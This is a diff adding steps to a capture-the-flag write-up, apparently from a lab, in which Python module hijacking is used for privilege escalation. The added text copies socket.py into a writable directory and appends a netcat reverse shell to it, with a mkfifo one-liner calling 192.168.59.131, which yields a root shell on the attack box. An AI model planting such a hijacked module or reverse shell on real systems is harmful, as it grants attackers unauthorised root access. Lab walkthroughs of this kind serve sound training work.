@@ -153,10 +153,32 @@ Python imports modules in a specific order and iut is possible to exploit this g
 [Source](https://www.webucator.com/article/how-python-finds-imported-modules)
 
 Let's pull in the real sockets.py file into the directory and modify it to exploit this configuration vulnerability on the machine.
+```
+find / -name socket.py 2>/dev/null
+cp /usr/lib/python3.10/socket.py .
+```
 
 ![image](https://user-images.githubusercontent.com/43767555/203451434-4f756d72-8933-4466-a17f-fe6a1e57ae2d.png)
 
 With the file succesfully pulled into the directory we can now build a reverse shell back to the attackbox.
 
 [Revshells.com](https://revshells.com)
+
 ![image](https://user-images.githubusercontent.com/43767555/203451481-0b4b7008-3976-4d6e-97f6-9d338cc80362.png)
+
+I checked for nc before building the shell.
+```
+which nc
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203454997-2c92d5d6-9325-4a98-9e23-89e9b2c34734.png)
+
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.59.131 80 >/tmp/f' >> socket.py && tail -n 10 socket.py
+```
+
+![image](https://user-images.githubusercontent.com/43767555/203455333-7cacc5bd-72e6-4a22-ad10-70cb465abe84.png)
+
+This pops a root shell on the attackbox where the root flag can be grabbed to finish!
+
+![image](https://user-images.githubusercontent.com/43767555/203455377-9af29b7d-8ad6-4988-97ce-8573f8344412.png)
